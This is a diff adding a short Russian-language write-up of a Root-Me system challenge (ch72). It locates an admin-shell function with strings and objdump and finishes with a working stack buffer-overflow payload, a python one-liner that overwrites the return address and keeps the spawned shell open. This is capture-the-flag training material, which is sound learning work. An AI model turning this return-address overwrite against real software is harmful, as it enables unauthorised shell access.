@@ -1,0 +1,54 @@
+ 	ssh -p 2225 app-systeme-ch72@challenge05.root-me.org
+
+	В gdb не сохранены имена функций
+
+	Посмотрим строки
+
+app-systeme-ch72@challenge05:~$ strings -t x ./ch72 | grep cmd
+  1386c cmd.exe
+  14573 .cmd
+  19200 C:\Windows\system32\cmd.exe
+
+  Отлично, есть адрес вызова командной строки, скорее всего он относится к нашей функции main
+
+  Посмотрим заголовки и узнаем где находится наша строка
+
+app-systeme-ch72@challenge05:~$ objdump -h ./ch72
+
+./ch72:     file format pei-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         000128db  00401000  00401000  00000400  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+  1 .rdata        000062a4  00414000  00414000  00012e00  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .data         00000a00  0041b000  0041b000  00019200  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+  3 .gfids        000000b0  0041d000  0041d000  00019c00  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+
+
+В данном случе адрес строки находится точно в начале data, в общем случае адрес можно посчитать как String File Offset=19200 - Header File Off=19200 + Header VMA=41b000
+
+
+Посмотрим в objdump что есть вокруг этого места, это и есть admin_shell, замоинм его адресс
+
+app-systeme-ch72@challenge05:~$ objdump -d ./ch72 | grep '00 b0 41 00' -B5 -A5
+Disassembly of section .text:
+
+00401000 <.text>:
+  401000:       55                      push   %ebp
+  401001:       8b ec                   mov    %esp,%ebp
+  401003:       68 00 b0 41 00          push   $0x41b000
+  401008:       e8 bf 2b 00 00          call   0x403bcc
+  40100d:       83 c4 04                add    $0x4,%esp
+  401010:       5d                      pop    %ebp
+  401011:       c3                      ret
+  401012:       cc                      int3
+
+
+После буфера лежит BP, а bp+4 это адрес возврата
+
+Рабочий пайлоад 0x14 - буфер, +4 ebp + целевой адрес:
+  (python -c "import sys; sys.stdout.write(b'A'*24+b'\x00\x10\x40\x00')"; cat) | ./wrapper.sh
